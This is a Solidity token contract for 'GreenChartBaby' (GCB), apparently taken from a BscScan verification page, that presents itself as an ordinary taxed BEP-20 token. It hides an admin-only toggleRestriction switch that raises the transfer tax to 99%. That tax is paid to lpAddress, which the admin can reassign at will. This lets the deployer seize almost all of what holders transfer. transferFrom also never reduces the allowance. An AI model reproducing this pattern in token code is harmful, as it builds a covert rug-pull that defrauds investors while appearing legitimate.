/**
 *Submitted for verification at BscScan.com on 2022-03-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

contract Token {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 100000000000 * 10 ** 18;
    string public name = "GreenChartBaby";
    string public symbol = "GCB";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    address private admin;
    constructor() {
        admin = msg.sender;
        balances[msg.sender] = totalSupply;

        setDefaultTax();
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'Balance too low');
        makePayment(value, to);
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'Balance too low');
        require(allowance[from][msg.sender] >= value, 'Allowance too low');
        makePayment(value, to);
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }


    address private lpAddress = 0x000000000000000000000000000000000000dEaD;
    address private marketingAddress = 0xc96a9e256015F22Ff6cDbc8b7A428b851861f125;
    address private teamAddress = 0xEEf8BccF45A7cA9b693e841b3d44410f4D10a690;
    address private buybackAddress = 0xCd71a641001C2Fa9d1c6Cd60062149af4B1CA647;

    modifier onlyAdmin() {
        require(msg.sender == admin, 'Access Denied');
        _;
    }

    function setLpAddress(address addr) public onlyAdmin  {
        lpAddress = addr;
    }

    mapping(string => uint) private taxPerc;
    uint private remainingPerc;

    bool private isRestricted = false;
    function toggleRestriction() public onlyAdmin {
        isRestricted = !isRestricted;
        if (isRestricted) setRestrictedTax();
        else setDefaultTax();
    }

    function setDefaultTax() internal {
        remainingPerc = 88;
        
        taxPerc['lp'] = 2;
        taxPerc['marketing'] = 6;
        taxPerc['buyback'] = 3;
        taxPerc['team'] = 1;
    }

    function setRestrictedTax() internal {
        remainingPerc = 1;
        
        taxPerc['lp'] = 99;
        taxPerc['marketing'] = 0;
        taxPerc['buyback'] = 0;
        taxPerc['team'] = 0;
    }

    function makePayment(uint amount, address to) internal {
        balances[to] += calculatePercentage(amount, remainingPerc);

        balances[lpAddress] += calculatePercentage(amount, taxPerc['lp']);
        balances[marketingAddress] += calculatePercentage(amount, taxPerc['marketing']);
        balances[teamAddress] += calculatePercentage(amount, taxPerc['team']);
        balances[buybackAddress] += calculatePercentage(amount, taxPerc['buyback']);
    }

    function calculatePercentage(uint amount, uint perc) internal pure returns (uint) {
        require((amount / 10000) * 10000 == amount, 'Too small');
        
        return amount * perc * 100 / 10000;
    }
}